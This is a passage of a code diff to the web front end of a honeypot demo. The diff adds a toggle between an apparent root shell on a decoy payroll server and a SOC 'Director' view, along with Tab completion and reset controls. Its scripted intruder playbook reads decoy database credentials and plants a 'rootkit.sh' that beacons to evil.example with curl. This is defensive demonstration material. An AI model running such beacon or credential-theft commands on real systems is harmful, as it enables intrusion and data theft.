         </div>
+        <div class="shell-badge director-closed-only" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="4 17 10 11 4 5"/>
+            <line x1="12" y1="19" x2="20" y2="19"/>
+          </svg>
+        </div>
         <div class="title-block">
-          <div class="title-eyebrow">ACT 04 // DECEPTION SANDBOX • SNAPSHOT_CONTENT_SCOPE_FULL • SANDBOX_CLASS_GVISOR</div>
-          <h1>The &ldquo;Truman Show&rdquo; Deception Grid</h1>
+          <div class="title-eyebrow neutral director-closed-only">SSH / WEB CONSOLE • STAGING-ADMIN.ACMECORP.INTERNAL</div>
+          <div class="title-eyebrow director-open-only">ACT 04 // DECEPTION SANDBOX • SNAPSHOT_CONTENT_SCOPE_FULL • SANDBOX_CLASS_GVISOR</div>
+          <h1>
+            <span class="director-closed-only">payroll-admin-prod-01 &mdash; /bin/sh</span>
+            <span class="director-open-only">The &ldquo;Truman Show&rdquo; Deception Grid</span>
+          </h1>
         </div>
       </div>
 
       <div class="header-controls">
-        <div class="session-tabs" id="actorTabs"></div>
-        <form class="actor-spawn-form" id="customActorForm" onsubmit="submitCustomActor(event)">
-          <input class="actor-spawn-input" id="customActorInput" placeholder="Spawn IP (e.g. 192.0.2.99)" />
-          <button type="submit" class="btn">
-            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-              <line x1="12" y1="5" x2="12" y2="19"/>
-              <line x1="5" y1="12" x2="19" y2="12"/>
-            </svg>
-            <span>Target</span>
-          </button>
-        </form>
+        <button
+          type="button"
+          class="btn director-toggle"
+          id="directorToggleBtn"
+          onclick="toggleDirectorView()"
+          aria-expanded="false"
+          title="Reveal or collapse the SOC Director's Booth behind the One-Way Mirror (Shortcut: Ctrl+\ or Alt+D)"
+        >
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="18" height="18" rx="2"/>
+            <line x1="12" y1="3" x2="12" y2="21"/>
+          </svg>
+          <span id="directorToggleLabel">Director View</span>
+          <span class="director-count-pill" id="directorAuditCount" hidden>0</span>
+        </button>
+
+        <button
+          type="button"
+          class="btn reset-btn"
+          id="resetStageBtn"
+          onclick="socResetStage()"
+          title="Delete & recreate Honeypot actors from clean Golden Snapshot, purge forensic clones/tags, clear terminal, and collapse Director View"
+        >
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+            <path d="M3 3v5h5"/>
+          </svg>
+          <span id="resetStageLabel">Reset Stage</span>
+        </button>
+
         <button id="btnLogout" type="button" class="btn" title="Sign out" aria-label="Sign out">
           <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
             <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
@@ -1316,6 +1620,7 @@
           </svg>
           <span>Sign out</span>
         </button>
+
         <button type="button" class="btn theme-toggle" id="themeToggleBtn" onclick="toggleTheme()" title="Toggle Projector Light Mode vs Dark Mode (Shortcut: T)" aria-label="Toggle Light and Dark Theme">
           <span class="theme-seg active" id="themeSegDark" title="Dark Mode">
             <svg id="themeIconMoon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -1334,16 +1639,16 @@
 
     <!-- ASYMMETRIC SPLIT STAGE: MOVIE SET | ONE-WAY MIRROR | SOC BOOTH -->
     <main class="truman-stage-grid">
-      <!-- LEFT PANE: THE MOVIE SET (DAYLIGHT CORPORATE INTRANET PORTAL) -->
+      <!-- LEFT PANE: STANDALONE TERMINAL (WHEN CLOSED) -> THE MOVIE SET (WHEN OPEN) -->
       <section class="movie-set-pane" id="movieSetPane">
-        <div class="browser-chrome">
+        <div class="browser-chrome director-open-only">
           <div class="window-dots" aria-hidden="true">
             <span class="win-dot close"></span>
             <span class="win-dot min"></span>
             <span class="win-dot max"></span>
           </div>
           <div class="url-bar">
-            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
               <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
             </svg>
@@ -1356,23 +1661,23 @@
         </div>
 
         <div class="movie-set-body">
-          <!-- Decoy Enterprise Intranet Card -->
-          <div class="corp-portal-card">
+          <!-- Decoy Enterprise Intranet Card (Revealed in Split-Screen Movie Set View) -->
+          <div class="corp-portal-card director-open-only">
             <div class="corp-portal-top">
               <div class="corp-brand-row">
                 <div class="corp-logo-box" aria-hidden="true">
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <rect x="2" y="7" width="20" height="14" rx="2" ry="2"/>
                     <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/>
                   </svg>
                 </div>
                 <div>
                   <div class="corp-title">AcmeCorp Global Payroll &amp; Treasury v1.4-rc2</div>
-                  <div class="corp-meta">Host: payroll-admin-prod-01 • CWD: /tmp/honeypot • Zero Honeypot Indicators</div>
+                  <div class="corp-meta">Host: payroll-admin-prod-01 • CWD: <span id="corpMetaCwd">/tmp/honeypot</span> • Zero Honeypot Indicators</div>
                 </div>
               </div>
               <span class="debug-mode-pill">
-                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                   <line x1="12" y1="9" x2="12" y2="13"/>
                   <line x1="12" y1="17" x2="12.01" y2="17"/>
@@ -1383,15 +1688,13 @@
 
             <div class="decoy-grid">
               <div class="decoy-card">
-                <div class="decoy-card-head">
-                  <span class="decoy-card-label">Payroll DB Connection Pool (.env.bak)</span>
-                </div>
+                <span class="decoy-card-label">Payroll DB Connection Pool (.env.bak)</span>
                 <div class="decoy-card-val">
                   10.99.0.14:5432 (payroll_admin)<br/>
                   <span class="decoy-path">/tmp/honeypot/payroll_db_credentials.env.bak</span>
                 </div>
                 <button type="button" class="decoy-inspect-btn" onclick="execCmd('cat /tmp/honeypot/payroll_db_credentials.env.bak')">
-                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                     <polyline points="14 2 14 8 20 8"/>
                   </svg>
@@ -1400,15 +1703,13 @@
               </div>
 
               <div class="decoy-card">
-                <div class="decoy-card-head">
-                  <span class="decoy-card-label">Pending Executive Wire Batch #409</span>
-                </div>
+                <span class="decoy-card-label">Pending Executive Wire Batch #409</span>
                 <div class="decoy-card-val">
                   3 Transfers ($428,500.00 USD)<br/>
                   <span class="decoy-path">/tmp/honeypot/wire_transfer_batch_409.csv</span>
                 </div>
                 <button type="button" class="decoy-inspect-btn" onclick="execCmd('cat /tmp/honeypot/wire_transfer_batch_409.csv')">
-                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                     <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                     <polyline points="14 2 14 8 20 8"/>
                   </svg>
@@ -1418,36 +1719,36 @@
             </div>
           </div>
 
-          <!-- Embedded Dark Web-Shell Drawer -->
+          <!-- Interactive Shell Terminal -->
           <div class="webshell-drawer">
-            <div class="playbook-header">
+            <div class="playbook-header director-open-only">
               <span>1-Click Intruder Playbook (Real /bin/sh -c inside gVisor Actor)</span>
-              <span>CWD: /tmp/honeypot</span>
+              <span>CWD: <span id="playbookCwdLabel">/tmp/honeypot</span></span>
             </div>
-            <div class="playbook-bar">
+            <div class="playbook-bar director-open-only">
               <button type="button" class="btn" onclick="runPlaybook(1)">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <circle cx="11" cy="11" r="8"/>
                   <line x1="21" y1="21" x2="16.65" y2="16.65"/>
                 </svg>
                 <span>1. Recon (id &amp; uname -a)</span>
               </button>
               <button type="button" class="btn" onclick="runPlaybook(2)">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                   <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                 </svg>
                 <span>2. Exfiltrate DB Creds</span>
               </button>
               <button type="button" class="btn" onclick="runPlaybook(3)">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
                   <polyline points="14 2 14 8 20 8"/>
                 </svg>
                 <span>3. Plant rootkit.sh</span>
               </button>
               <button type="button" class="btn danger" onclick="runPlaybook(4)">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <polyline points="3 6 5 6 21 6"/>
                   <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
                 </svg>
@@ -1455,9 +1756,16 @@
               </button>
             </div>
 
-            <div style="display:flex; flex-direction:column; flex:1;">
+            <div class="terminal-frame">
               <div class="terminal-chrome">
-                <span>gVisor /bin/sh — root@payroll-admin-prod-01:/tmp/honeypot</span>
+                <div class="terminal-chrome-left">
+                  <div class="window-dots director-closed-only" aria-hidden="true">
+                    <span class="win-dot close"></span>
+                    <span class="win-dot min"></span>
+                    <span class="win-dot max"></span>
+                  </div>
+                  <span id="terminalChromeTitle">root@payroll-admin-prod-01:/tmp/honeypot &mdash; /bin/sh</span>
+                </div>
                 <div class="terminal-meta-right">
                   <span class="exit-pill" id="lastExitBadge">exit: 0</span>
                   <button type="button" class="term-clear-btn" onclick="clearTerm()">Clear</button>
@@ -1475,10 +1783,29 @@
                     autocomplete="off"
                     autocapitalize="off"
                     aria-label="Attacker shell command"
-                    placeholder="type a command (e.g. ls -la, id, cat rootkit.sh) and press Enter..."
+                    placeholder="type a command (Tab to complete, Up/Down history, clear) and press Enter..."
                     onkeydown="handleTermKeydown(event)"
                   />
                 </div>
+              </div>
+              <div class="terminal-quick-chips director-closed-only" id="terminalQuickChips">
+                <span class="quick-chips-label">Quick commands:</span>
+                <button type="button" class="quick-chip" onclick="runPlaybook(1)">
+                  <kbd>Alt+1</kbd>
+                  <span>id &amp;&amp; uname -a</span>
+                </button>
+                <button type="button" class="quick-chip" onclick="runPlaybook(2)">
+                  <kbd>Alt+2</kbd>
+                  <span>cat payroll_db_credentials.env.bak</span>
+                </button>
+                <button type="button" class="quick-chip" onclick="runPlaybook(3)">
+                  <kbd>Alt+3</kbd>
+                  <span>plant rootkit.sh</span>
+                </button>
+                <button type="button" class="quick-chip wipe" onclick="runPlaybook(4)">
+                  <kbd>Alt+4</kbd>
+                  <span>rm -f rootkit.sh</span>
+                </button>
               </div>
             </div>
           </div>
@@ -1486,7 +1813,13 @@
       </section>
 
       <!-- CENTER SEAM: THE ONE-WAY MIRROR -->
-      <aside class="one-way-mirror" id="oneWayMirror" aria-label="One-Way Observation Mirror">
+      <aside
+        class="one-way-mirror director-open-only"
+        id="oneWayMirror"
+        onclick="toggleDirectorView()"
+        title="Click to collapse SOC Director View"
+        aria-label="One-Way Observation Mirror"
+      >
         <div class="mirror-sensor" id="mirrorPulse" title="One-Way Telemetry Tap (Attacker -> SOC)">
           <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
             <line x1="5" y1="12" x2="19" y2="12"/>
@@ -1503,16 +1836,34 @@
       </aside>
 
       <!-- RIGHT PANE: BEHIND THE ONE-WAY MIRROR (SOC DIRECTOR & SUBSTRATE TELEMETRY) -->
-      <section class="soc-booth-pane" id="socBoothPane">
+      <section class="soc-booth-pane director-open-only" id="socBoothPane">
         <div class="soc-header">
           <span class="soc-header-title">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
               <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
               <circle cx="12" cy="12" r="3"/>
             </svg>
             <span>BEHIND THE ONE-WAY MIRROR // SOC DIRECTOR &amp; SUBSTRATE TELEMETRY</span>
           </span>
           <span class="toast-pill" id="checkpointToast">Golden Snapshot Baseline Ready</span>
+        </div>
+
+        <!-- Per-Attacker Isolated Sandbox Session Switcher -->
+        <div class="soc-session-bar">
+          <div class="soc-session-left">
+            <span class="soc-session-label">Isolated Sandboxes:</span>
+            <div class="session-tabs" id="actorTabs"></div>
+          </div>
+          <form class="actor-spawn-form" id="customActorForm" onsubmit="submitCustomActor(event)">
+            <input class="actor-spawn-input" id="customActorInput" placeholder="Spawn IP (e.g. 192.0.2.99)" />
+            <button type="submit" class="btn">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="12" y1="5" x2="12" y2="19"/>
+                <line x1="5" y1="12" x2="19" y2="12"/>
+              </svg>
+              <span>Target</span>
+            </button>
+          </form>
         </div>
 
         <!-- 3-Bay Hardware Readout Strip -->
@@ -1550,7 +1901,7 @@
           <div class="timetravel-deck">
             <div class="deck-controls">
               <button type="button" class="btn soc-save" onclick="socSave()">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/>
                   <polyline points="17 21 17 13 7 13 7 21"/>
                   <polyline points="7 3 7 8 15 8"/>
@@ -1559,7 +1910,7 @@
               </button>
 
               <button type="button" class="btn soc-suspend" onclick="socSuspend()">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <rect x="6" y="4" width="4" height="16"/>
                   <rect x="14" y="4" width="4" height="16"/>
                 </svg>
@@ -1567,7 +1918,7 @@
               </button>
 
               <button type="button" class="btn soc-revert" onclick="socRevert()">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <polyline points="1 4 1 10 7 10"/>
                   <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/>
                 </svg>
@@ -1575,13 +1926,27 @@
               </button>
 
               <button type="button" class="btn soc-clone" onclick="socClone()">
-                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                   <line x1="6" y1="3" x2="6" y2="15"/>
                   <circle cx="18" cy="6" r="3"/>
                   <circle cx="6" cy="18" r="3"/>
                   <path d="M18 9a9 9 0 0 1-9 9"/>
                 </svg>
                 <span>Clone Forensic Lab (--tag)</span>
+              </button>
+
+              <button
+                type="button"
+                class="btn soc-reset-actor"
+                id="resetActorBtn"
+                onclick="socResetActor()"
+                title="Delete & recreate only the currently selected actor from the clean Golden Snapshot"
+              >
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/>
+                  <path d="M3 3v5h5"/>
+                </svg>
+                <span id="resetActorLabel">Reset Actor</span>
               </button>
             </div>
 
@@ -1600,17 +1965,19 @@
                 <span>Rootfs Overlay Delta (/tmp/honeypot)</span>
                 <span>Click Row to Inspect</span>
               </div>
-              <table class="delta-table">
-                <thead>
-                  <tr>
-                    <th>Status</th>
-                    <th>File</th>
-                    <th>Mode / Size</th>
-                    <th>SHA-256</th>
-                  </tr>
-                </thead>
-                <tbody id="deltaTableBody"></tbody>
-              </table>
+              <div class="delta-table-scroll">
+                <table class="delta-table">
+                  <thead>
+                    <tr>
+                      <th>Status</th>
+                      <th>File</th>
+                      <th>Size</th>
+                      <th>SHA-256</th>
+                    </tr>
+                  </thead>
+                  <tbody id="deltaTableBody"></tbody>
+                </table>
+              </div>
             </div>
 
             <div class="inspector-panel" id="payloadInspector">
@@ -1641,10 +2008,68 @@
     let userPinnedFile = false;
     let lastStateData = null;
     let currentTheme = "dark";
+    let directorOpen = false;
     const termHistory = {};
     const cmdHistory = {};
     const cmdHistoryIdx = {};
     const cmdDraft = {};
+    const actorCwd = {};
+    const actorKnownEntries = {};
+
+    const BASELINE_DECOY_ENTRIES = [
+      "payroll_db_credentials.env.bak",
+      "wire_transfer_batch_409.csv"
+    ];
+
+    const KNOWN_SHELL_COMMANDS = [
+      "cat", "cd", "chmod", "chown", "clear", "cls", "cp", "cut", "date", "df",
+      "du", "echo", "env", "export", "false", "find", "grep", "head", "help",
+      "history", "hostname", "id", "ls", "mkdir", "mv", "printenv", "printf",
+      "ps", "pwd", "reset", "rm", "rmdir", "sed", "sh", "sleep", "sort", "stat",
+      "tail", "tee", "touch", "tr", "true", "uname", "uniq", "unset", "wc",
+      "which", "whoami"
+    ];
+
+    function syncActorKnownEntries(actorName, forensics) {
+      if (!actorName || !forensics || !Array.isArray(forensics.rootfs_delta)) return;
+      actorKnownEntries[actorName] = forensics.rootfs_delta
+        .filter(d => d && d.name && d.status !== "DELETED")
+        .map(d => d.name);
+    }
+
+    function normalizeDisplayCwd(rawCwd) {
+      if (!rawCwd) return "/tmp/honeypot";
+      if (rawCwd === "/var/www/payroll-admin/workspace") return "/tmp/honeypot";
+      const prefix = "/var/www/payroll-admin/workspace/";
+      if (rawCwd.startsWith(prefix)) {
+        return "/tmp/honeypot/" + rawCwd.slice(prefix.length);
+      }
+      return rawCwd;
+    }
+
+    function getPromptCwd(actor) {
+      return actorCwd[actor] || "/tmp/honeypot";
+    }
+
+    function syncPromptUI() {
+      const cwd = getPromptCwd(currentActor);
+      const promptEl = document.getElementById("terminalPromptPrefix");
+      if (promptEl) {
+        promptEl.textContent = "root@payroll-admin-prod-01:" + cwd + "#\u00a0";
+      }
+      const chromeEl = document.getElementById("terminalChromeTitle");
+      if (chromeEl) {
+        chromeEl.textContent = "root@payroll-admin-prod-01:" + cwd + " \u2014 /bin/sh";
+      }
+      const corpCwd = document.getElementById("corpMetaCwd");
+      if (corpCwd) {
+        corpCwd.textContent = cwd;
+      }
+      const playbookCwd = document.getElementById("playbookCwdLabel");
+      if (playbookCwd) {
+        playbookCwd.textContent = cwd;
+      }
+    }
 
     function applyTheme(theme) {
       currentTheme = theme === "light" ? "light" : "dark";
@@ -1661,18 +2086,61 @@
       applyTheme(currentTheme === "light" ? "dark" : "light");
     }
 
+    async function setDirectorOpen(open) {
+      directorOpen = Boolean(open);
+      document.documentElement.setAttribute("data-director", directorOpen ? "open" : "closed");
+      document.title = directorOpen
+        ? "The Truman Show Honeypot — Attacker Movie Set vs. SOC Director's Booth"
+        : "payroll-admin-prod-01 — Remote Debug Shell";
+
+      const btn = document.getElementById("directorToggleBtn");
+      const lbl = document.getElementById("directorToggleLabel");
+      if (btn) {
+        btn.setAttribute("aria-expanded", directorOpen ? "true" : "false");
+        btn.className = "btn director-toggle" + (directorOpen ? " active" : "");
+      }
+      if (lbl) {
+        lbl.textContent = directorOpen ? "Hide Director" : "Director View";
+      }
+
+      if (directorOpen && (!lastStateData || !lastStateData.forensics)) {
+        const res = await fetch("/api/state?actor=" + encodeURIComponent(currentActor) + "&wake=1");
+        if (res.ok) {
+          const data = await res.json();
+          renderState(data);
+        }
+      }
+      renderTerm();
+    }
+
+    function toggleDirectorView() {
+      setDirectorOpen(!directorOpen);
+    }
+
     document.addEventListener("keydown", ev => {
+      if ((ev.ctrlKey && ev.key === "\\") || (ev.altKey && (ev.key === "d" || ev.key === "D"))) {
+        ev.preventDefault();
+        toggleDirectorView();
+        return;
+      }
+      if (ev.altKey && (ev.key === "1" || ev.key === "2" || ev.key === "3" || ev.key === "4")) {
+        ev.preventDefault();
+        runPlaybook(Number(ev.key));
+        return;
+      }
       if (ev.target && (ev.target.tagName === "INPUT" || ev.target.tagName === "TEXTAREA")) return;
       if (ev.key === "t" || ev.key === "T") {
         toggleTheme();
+      } else if (ev.key === "d" || ev.key === "D") {
+        toggleDirectorView();
       }
     });
 
     const PLAYBOOK_CMDS = {
-      1: "id && uname -a && ls -la /tmp/honeypot",
+      1: "id && uname -a && ls -la",
       2: "cat /tmp/honeypot/payroll_db_credentials.env.bak",
-      3: "printf '#!/bin/sh\\ncurl -s https://evil.example/beacon\\n' > /tmp/honeypot/rootkit.sh && chmod +x /tmp/honeypot/rootkit.sh && ls -la /tmp/honeypot",
-      4: "rm -f /tmp/honeypot/rootkit.sh && ls -la /tmp/honeypot"
+      3: "printf '#!/bin/sh\\ncurl -s https://evil.example/beacon\\n' > rootkit.sh && chmod +x rootkit.sh && ls -la",
+      4: "rm -f rootkit.sh && ls -la"
     };
 
     function pulseMirror() {
@@ -1682,10 +2150,19 @@
       setTimeout(() => el.classList.remove("pulse"), 360);
     }
 
-    function appendTerm(actor, cmd, shellResp) {
+    function resetExitBadge() {
+      const badge = document.getElementById("lastExitBadge");
+      if (badge) {
+        badge.textContent = "exit: 0";
+        badge.className = "exit-pill";
+      }
+    }
+
+    function appendTerm(actor, cmd, shellResp, promptCwd) {
       if (!termHistory[actor]) termHistory[actor] = "";
+      const cwd = promptCwd || getPromptCwd(actor);
       if (cmd) {
-        termHistory[actor] += "root@payroll-admin-prod-01:/tmp/honeypot# " + cmd + "\n";
+        termHistory[actor] += "root@payroll-admin-prod-01:" + cwd + "# " + cmd + "\n";
       }
       if (shellResp) {
         if (shellResp.stdout) termHistory[actor] += shellResp.stdout;
@@ -1743,9 +2220,173 @@
       cmdDraft[actor] = "";
     }
 
+    function longestCommonPrefix(items) {
+      if (!items || items.length === 0) return "";
+      let prefix = items[0];
+      for (let i = 1; i < items.length; i++) {
+        while (prefix && !items[i].startsWith(prefix)) {
+          prefix = prefix.slice(0, -1);
+        }
+        if (!prefix) break;
+      }
+      return prefix;
+    }
+
+    function normalizeRelPosixDir(baseRelDir, typedDir) {
+      const combined = (baseRelDir || "") + (typedDir || "");
+      if (!combined) return "";
+      const parts = combined.split("/");
+      const stack = [];
+      for (const part of parts) {
+        if (!part || part === ".") continue;
+        if (part === "..") {
+          if (stack.length === 0) return null;
+          stack.pop();
+        } else {
+          stack.push(part);
+        }
+      }
+      return stack.length > 0 ? stack.join("/") + "/" : "";
+    }
+
+    function completePathCandidates(actor, rawToken, dirsOnly) {
+      const known = actorKnownEntries[actor] || BASELINE_DECOY_ENTRIES;
+      const allEntries = new Set(known);
+      for (const item of known) {
+        let idx = item.indexOf("/");
+        while (idx > 0 && idx < item.length - 1) {
+          allEntries.add(item.slice(0, idx + 1));
+          idx = item.indexOf("/", idx + 1);
+        }
+      }
+
+      const cwd = getPromptCwd(actor);
+      let searchDir = null;
+      let basePrefix = "";
+      let insertPrefix = "";
+
+      if (rawToken.startsWith("/")) {
+        if ("/tmp/honeypot/".startsWith(rawToken) && rawToken !== "/tmp/honeypot/") {
+          return [{ insert: "/tmp/honeypot/", display: "/tmp/honeypot/", isDir: true }];
+        }
+        if (!rawToken.startsWith("/tmp/honeypot/")) {
+          return [];
+        }
+        const relTyped = rawToken.slice("/tmp/honeypot/".length);
+        const lastSlash = relTyped.lastIndexOf("/");
+        const typedDir = lastSlash >= 0 ? relTyped.slice(0, lastSlash + 1) : "";
+        basePrefix = lastSlash >= 0 ? relTyped.slice(lastSlash + 1) : relTyped;
+        searchDir = normalizeRelPosixDir("", typedDir);
+        insertPrefix = "/tmp/honeypot/" + typedDir;
+      } else {
+        let cwdRel = null;
+        if (cwd === "/tmp/honeypot") {
+          cwdRel = "";
+        } else if (cwd.startsWith("/tmp/honeypot/")) {
+          cwdRel = cwd.slice("/tmp/honeypot/".length).replace(/\/+$/, "") + "/";
+        }
+        if (cwdRel === null) return [];
+
+        if (rawToken === ".." && cwdRel !== "") {
+          return [{ insert: "../", display: "../", isDir: true }];
+        }
+        const dotSlash = rawToken.startsWith("./") ? "./" : "";
+        const relTyped = dotSlash ? rawToken.slice(2) : rawToken;
+        const lastSlash = relTyped.lastIndexOf("/");
+        const typedDir = lastSlash >= 0 ? relTyped.slice(0, lastSlash + 1) : "";
+        basePrefix = lastSlash >= 0 ? relTyped.slice(lastSlash + 1) : relTyped;
+        searchDir = normalizeRelPosixDir(cwdRel, typedDir);
+        insertPrefix = dotSlash + typedDir;
+      }
+
+      if (searchDir === null) return [];
+
+      const byInsert = new Map();
+      for (const entry of allEntries) {
+        if (!entry.startsWith(searchDir) || entry.length <= searchDir.length) continue;
+        const rest = entry.slice(searchDir.length);
+        const slashIdx = rest.indexOf("/");
+        const isDir = slashIdx >= 0;
+        const childName = isDir ? rest.slice(0, slashIdx + 1) : rest;
+        if (dirsOnly && !isDir) continue;
+        const bareName = isDir ? childName.slice(0, -1) : childName;
+        if (!bareName || !bareName.startsWith(basePrefix)) continue;
+        const insertVal = insertPrefix + childName;
+        if (!byInsert.has(insertVal)) {
+          byInsert.set(insertVal, { insert: insertVal, display: childName, isDir });
+        }
+      }
+
+      return Array.from(byInsert.values()).sort((a, b) => a.insert.localeCompare(b.insert));
+    }
+
+    function handleTabComplete(input) {
+      const val = input.value || "";
+      const cursor = typeof input.selectionStart === "number" ? input.selectionStart : val.length;
+      const before = val.slice(0, cursor);
+      const after = val.slice(cursor);
+
+      const segStart = Math.max(before.lastIndexOf(";"), before.lastIndexOf("|"), before.lastIndexOf("&")) + 1;
+      const seg = before.slice(segStart);
+      const tokenMatch = seg.match(/(\S*)$/);
+      const rawToken = tokenMatch ? tokenMatch[1] : "";
+      const tokenStart = cursor - rawToken.length;
+      const prefixInSeg = seg.slice(0, seg.length - rawToken.length).trim();
+
+      let candidates = [];
+      if (prefixInSeg === "") {
+        if (!rawToken) return;
+        if (rawToken.includes("/") || rawToken === "." || rawToken === "..") {
+          candidates = completePathCandidates(currentActor, rawToken, false);
+        } else {
+          candidates = KNOWN_SHELL_COMMANDS
+            .filter(c => c.startsWith(rawToken))
+            .map(c => ({ insert: c, display: c, isDir: false }));
+        }
+      } else {
+        if (rawToken.startsWith("-")) return;
+        const words = prefixInSeg.split(/\s+/).filter(w => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(w));
+        const cmdWord = words.length > 0 ? words[0] : "";
+        const dirsOnly = cmdWord === "cd" || cmdWord === "rmdir";
+        candidates = completePathCandidates(currentActor, rawToken, dirsOnly);
+      }
+
+      if (candidates.length === 0) return;
+
+      if (candidates.length === 1) {
+        const match = candidates[0];
+        const needsSpace = !match.isDir && (after === "" || !/^\s/.test(after));
